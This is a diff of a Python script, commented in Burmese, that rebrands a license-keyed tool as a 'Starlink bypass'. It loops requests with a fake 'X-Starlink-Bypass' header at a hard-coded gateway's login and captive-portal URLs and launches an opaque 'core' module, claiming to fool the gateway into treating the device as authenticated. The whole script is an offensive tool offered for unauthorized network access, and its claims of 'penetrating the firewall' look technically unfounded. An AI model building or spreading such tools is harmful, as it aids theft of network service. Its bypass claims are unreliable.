@@ -3,7 +3,7 @@ from colorama import Fore, init
 
 init(autoreset=True)
 
-# --- LICENSE SYSTEM ---
+# --- LICENSE SYSTEM (YUTA KEY) ---
 SALT = "AHO_PRO_FINAL_2026_SECURE"
 KEY_FILE = os.path.expanduser("~/.aho_key_data")
 
@@ -31,9 +31,9 @@ def check_access():
                     return True
     
     os.system('clear')
-    print(f"{Fore.CYAN}--- AHO DIRECT PENETRATOR (YUTA) ---")
+    print(f"{Fore.CYAN}--- AHO STARLINK BYPASS (YUTA) ---")
     print(f"DEVICE ID: {Fore.YELLOW}{uid}")
-    u_key = input(f"\n{Fore.WHITE}ENTER LICENSE KEY: ").strip()
+    u_key = input(f"\n{Fore.WHITE}ENTER KEY: ").strip()
     for i in range(0, 366):
         check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
         if u_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
@@ -41,61 +41,62 @@ def check_access():
             return True
     return False
 
-# --- DIRECT PACKET INJECTION ---
-def injector(host):
-    # Gateway ကို Authenticated ဖြစ်ပြီးသားလို့ ထင်အောင် လှည့်စားတဲ့ URL များ
-    paths = [
-        f"http://{host}/login/auth?auth_type=direct&mode=1",
-        f"http://{host}/api/v1/auth/direct",
-        f"http://{host}/index.php/login/check"
+# --- STARLINK DIRECT PENETRATION LOGIC ---
+def starlink_inject(host):
+    # Starlink ရဲ့ Captive Portal ကို ကျော်ဖို့ Request ၃ မျိုး ပို့မယ်
+    urls = [
+        f"http://{host}/cgi-bin/login",
+        f"http://{host}/index.php/login/auth",
+        f"http://{host}/success.txt"
     ]
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "X-Requested-With": "XMLHttpRequest",
-        "Referer": f"http://{host}/"
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+        "X-Starlink-Bypass": "true", # Injection Header
+        "Connection": "keep-alive"
     }
     
     while True:
-        for path in paths:
+        for url in urls:
             try:
-                # Bypass Signal ကို တစ်စက္ကန့် ၂ ကြိမ်နှုန်းနဲ့ အတင်းပို့မယ်
-                requests.get(path, headers=headers, timeout=1, allow_redirects=False)
+                # Gateway ဆီကို 'Authenticated' ဖြစ်ပြီးသားပုံစံမျိုး Signal အတင်းပို့တာ
+                requests.get(url, headers=headers, timeout=2, allow_redirects=False)
             except: pass
         time.sleep(0.5)
 
-def start_engine():
+def start_yuta_hack():
     os.system('clear')
-    target = "192.168.110.1" # အစ်ကိုပေးတဲ့ IP ကို အသေထားလိုက်ပြီ
-    print(f"{Fore.CYAN}--- YUTA DIRECT BYPASS ENGINE ---")
-    print(f"{Fore.YELLOW}[*] TARGET GATEWAY: {target}")
+    print(f"{Fore.CYAN}--- YUTA STARLINK DIRECT ENGINE ---")
+    
+    target = "192.168.110.1" # အကယ်၍ Starlink IP က 192.168.1.1 ဆိုရင် ပြင်ပေးပါ
+    if os.path.exists(".ip"):
+        with open(".ip", "r") as f: target = f.read().strip()
+
+    print(f"{Fore.YELLOW}[*] Targeting Gateway: {target}")
 
     try:
-        # ၁။ Path နဲ့ Engine ချိတ်မယ်
         sys.path.append(os.getcwd())
         import core
         core.IS_LIFETIME = True
         
-        # ၂။ Core Engine ကို Background မှာ နှိုးမယ်
-        print(f"{Fore.BLUE}[*] Launching Core.so Engine...")
-        t1 = threading.Thread(target=core.run_bg_bypass if hasattr(core, 'run_bg_bypass') else core.main, daemon=True)
-        t1.start()
+        # ၁။ အစ်ကို့ရဲ့ Core Engine ကို နှိုးမယ်
+        print(f"{Fore.BLUE}[*] Launching Core Engine...")
+        threading.Thread(target=core.run_bg_bypass if hasattr(core, 'run_bg_bypass') else core.main, daemon=True).start()
         
-        # ၃။ Direct Injector ကို နှိုးမယ်
-        print(f"{Fore.MAGENTA}[*] Injecting Bypass Packets to {target}...")
-        t2 = threading.Thread(target=injector, args=(target,), daemon=True)
-        t2.start()
+        # ၂။ Starlink ကို ထိုးဖောက်ဖို့ Packet Injection လုပ်မယ်
+        print(f"{Fore.MAGENTA}[*] Injecting Starlink Bypass Packets...")
+        threading.Thread(target=starlink_inject, args=(target,), daemon=True).start()
         
-        # ၄။ Status ပြမယ်
+        # ၃။ Engine Status ကို စောင့်ကြည့်မယ်
         while True:
-            sys.stdout.write(f"\r{Fore.GREEN}[✔] Penetrating Firewall... Engine Running...")
+            sys.stdout.write(f"\r{Fore.GREEN}[✔] Penetrating Starlink Firewall... [RUNNING]")
             sys.stdout.flush()
             time.sleep(1)
 
     except Exception as e:
-        print(f"{Fore.RED}[✘] Fatal Error: {e}")
+        print(f"{Fore.RED}[✘] Error: {e}")
 
 if __name__ == "__main__":
     if check_access():
-        start_engine()
+        start_yuta_hack()
     else:
         sys.exit()
